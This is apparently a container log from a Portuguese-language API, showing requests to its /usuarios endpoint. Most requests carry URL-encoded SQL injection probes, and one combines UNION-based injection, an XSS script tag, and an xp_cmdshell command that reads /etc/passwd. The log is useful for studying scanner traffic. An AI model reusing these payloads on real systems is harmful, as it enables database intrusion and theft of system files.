api-1  | Servidor rodando em http://0.0.0.0:8000
api-1  | 172.18.0.1 - GET /usuarios HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios?ZUuP=1276%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios HTTP/1.1
api-1  | 172.18.0.1 - GET /1968 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%28%22%29%29%29%29%27%29%2C%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27RsbqVA%3C%27%22%3EGTqarA HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%29%2F%2A%2A%2FAND%2F%2A%2A%2F5734%3D3903%2F%2A%2A%2FAND%2F%2A%2A%2F%281813%3D1813 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%29%2F%2A%2A%2FAND%2F%2A%2A%2F9673%3D9673%2F%2A%2A%2FAND%2F%2A%2A%2F%281313%3D1313 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F3983%3D8590 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F9673%3D9673 HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F9909%3D7825%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27snHw%27%3D%27snHw HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F9673%3D9673%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27ZWja%27%3D%27ZWja HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%2F%2A%2A%2FAND%2F%2A%2A%2F3133%3D1058%2F%2A%2A%2FAND%2F%2A%2A%2F%27WWjb%27%3D%27WWjb HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%27%2F%2A%2A%2FAND%2F%2A%2A%2F9673%3D9673%2F%2A%2A%2FAND%2F%2A%2A%2F%27hOxE%27%3D%27hOxE HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F3968%3D8038--%2F%2A%2A%2FnhUK HTTP/1.1
api-1  | 172.18.0.1 - GET /usuarios%2F%2A%2A%2FAND%2F%2A%2A%2F9673%3D9673--%2F%2A%2A%2FlUfO HTTP/1.1
